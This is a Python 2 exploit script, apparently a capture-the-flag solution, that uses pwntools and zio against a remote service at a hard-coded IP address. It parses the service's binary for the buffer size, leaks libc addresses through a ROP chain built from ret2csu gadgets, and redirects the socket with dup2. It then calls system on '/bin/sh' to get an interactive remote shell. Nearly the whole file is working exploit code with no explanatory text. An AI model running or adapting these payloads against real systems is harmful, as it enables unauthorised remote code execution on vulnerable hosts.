from pwn import *
from zio import *

context(arch = 'amd64', os = 'linux')

target = ('54.86.195.190', 8888)

def get_io(target):
	io = zio(target, timeout = 9999, print_read = COLORED(RAW, 'green'), print_write = COLORED(RAW, 'blue'))
	return io

def save_data(data, filename):
	file_w = open(filename, 'w')
	file_w.write(data)
	file_w.close()


def parse_data(data, save_switch = False):
	if True:
		if save_switch == True:
			save_data(data, 'prog2')

		port = l32(data[0x7d5:(0x7d5 + 4)])
		if port >= 65535:
			return port, 0, 0
		print "[!]port:", port

		asm_info = disasm(data[0x821:0x83d], offset = False, byte = False)
		print asm_info
		sam_lines = asm_info.split('\n')
		
		stack_len_pos = len('lea    rcx,[rbp-')
		read_len_pos = len('mov    edx,')

		stack_len = int(sam_lines[1][stack_len_pos:-1], 16)
		print "[!]stack_len:", hex(stack_len)

		read_len = int(sam_lines[3][read_len_pos:], 16)
		print "[!]read_len:", hex(read_len)


		return port, read_len, stack_len

def pwn(target):
	stack_len = 0
	read_len = 0
	while True:
		io = get_io(target)
		data = io.read(8955)

		port, read_len, stack_len = parse_data(data, True)

		left_len = read_len - stack_len
		if port >= 65535:
			print "[!]error"
			continue

		if left_len > 24 * 8:
			print "[!]can pwn"
			print "[!]left len:", read_len - stack_len
			return 

	#ELF("./prog2")
	#target = (target[0], port)
	#io = get_io(target)


pop_args_addr = 0x4008ca
#pop rbx	(zero)
#pop rbp	(none)
#pop r12	(func)
#pop r13	(arg3)
#pop r14	(arg2)
#pop r15	(arg1)
#ret

set_args_addr = 0x4008b0
#mov rdx, r13	(arg3)
#mov rsi, r14	(arg2)
#mov rdi, r15	(arg1)
#call [r12 + rbx * 8]

write_got = 0x601018

def get_addr(target):
	port = 0
	read_len = 0
	stack_len = 0
	file_r = open("./prog2", 'r')
	data = file_r.read()
	file_r.close()
	left_len = read_len - stack_len
	if True:
		port, read_len, stack_len = parse_data(data)
		
		if port >= 65535:
			print "[!]error"
			return
		if left_len > 8:
			print "[!]can pwn"
			print "[!]left len:", read_len - stack_len

	target = (target[0], port)
	io = get_io(target)

	shellcode = l64(pop_args_addr) + l64(0) + l64(1) + l64(write_got) + l64(8) + l64(write_got)  + l64(6) + l64(set_args_addr)
	
	ebp_addr = 'a' * 8
	pay_load = 'a' * stack_len + ebp_addr + shellcode
	io.write(pay_load + "\n")
	data = io.read(8)
	print [c for c in data]

	write_addr = l64(data)
	print "write_addr:", hex(write_addr)



write_addr = 0x7ffff7b00860
libc_addr = write_addr - 0x00000000000eb860

system_addr = 0x0000000000046640 + libc_addr
binstr_addr = 0x17ccdb + libc_addr
dup2_addr = 0x00000000000ebfe0 + libc_addr



def pwn2(target):
	read_got = 0x0000000000601038

	tmp_got = 0x0000000000601058#bind_got
	port = 0
	read_len = 0
	stack_len = 0
	file_r = open("./prog2", 'r')
	data = file_r.read()
	file_r.close()
	left_len = read_len - stack_len
	if True:
		port, read_len, stack_len = parse_data(data)
		
		if port >= 65535:
			print "[!]error"
			return
		if left_len > 8:
			print "[!]can pwn"
			print "[!]left len:", read_len - stack_len

	target = (target[0], port)
	io = get_io(target)

	#read dup2_addr
	dup2_got = tmp_got
	shellcode = l64(pop_args_addr) + l64(0) + l64(1) + l64(read_got) + l64(8) + l64(dup2_got)  + l64(6) + l64(set_args_addr)
	#dup 0
	shellcode += ebp_addr + l64(pop_args_addr) + l64(0) + l64(1) + l64(dup2_got) + l64(8) + l64(6)  + l64(0) + l64(set_args_addr)
	#dup 1
	shellcode += ebp_addr + l64(pop_args_addr) + l64(0) + l64(1) + l64(dup2_got) + l64(8) + l64(6)  + l64(1) + l64(set_args_addr)
	#dup 2
	shellcode += ebp_addr + l64(pop_args_addr) + l64(0) + l64(1) + l64(dup2_got) + l64(8) + l64(6)  + l64(2) + l64(set_args_addr)
	
	
	#read system_addr
	system_got = tmp_got
	shellcode += ebp_addr + l64(pop_args_addr) + l64(0) + l64(1) + l64(read_got) + l64(8) + l64(system_got)  + l64(6) + l64(set_args_addr)
	#call system binstr
	shellcode += ebp_addr + l64(pop_args_addr) + l64(0) + l64(1) + l64(system_got) + l64(8) + l64(6)  + l64(binstr_addr) + l64(set_args_addr)
	
	ebp_addr = 'a' * 8
	pay_load = 'a' * stack_len + ebp_addr + shellcode
	io.write(pay_load + "\n")
	io.write(l64(dup2_addr))
	io.write(l64(system_addr))

	io.interact()

pop_rdi_addr = 0x00000000004008d3
pop_rsi_r15_addr = 0x00000000004008d1

def pwn3(target):
	port = 0
	read_len = 0
	stack_len = 0
	file_r = open("./prog2", 'r')
	data = file_r.read()
	file_r.close()
	left_len = read_len - stack_len
	if True:
		port, read_len, stack_len = parse_data(data)
		
		if port >= 65535:
			print "[!]error"
			return
		if left_len > 8:
			print "[!]can pwn"
			print "[!]left len:", read_len - stack_len

	target = (target[0], port)
	io = get_io(target)


	#local 
	"""
	write_addr = int(raw_input("write_addr:"), 16)
	libc_addr = write_addr - 0x00000000000eb590
	system_addr = 0x0000000000044c40 + libc_addr
	binstr_addr = 0x17c09b + libc_addr
	dup2_addr = 0x00000000000ebc70 + libc_addr
	"""


	ebp_addr = 'a' * 8
	shellcode = ""
	#dup 0
	shellcode += l64(pop_rdi_addr) + l64(6)
	shellcode += l64(pop_rsi_r15_addr) + l64(0) + l64(1)
	shellcode += l64(dup2_addr)# + ebp_addr
	#dup 1
	shellcode += l64(pop_rdi_addr) + l64(6)
	shellcode += l64(pop_rsi_r15_addr) + l64(1) + l64(1)
	shellcode += l64(dup2_addr)# + ebp_addr
	#dup 2
	shellcode += l64(pop_rdi_addr) + l64(6)
	shellcode += l64(pop_rsi_r15_addr) + l64(2) + l64(1)
	shellcode += l64(dup2_addr)# + ebp_addr

	#call system binstr
	shellcode += l64(pop_rdi_addr) + l64(binstr_addr)
	shellcode += l64(system_addr)

	pay_load = 'a' * stack_len + ebp_addr + shellcode
	io.write(pay_load + "\n")

	io.interact()

#target = ('127.0.0.1', 36184)
pwn(target)	
#get_addr(target)
pwn3(target)
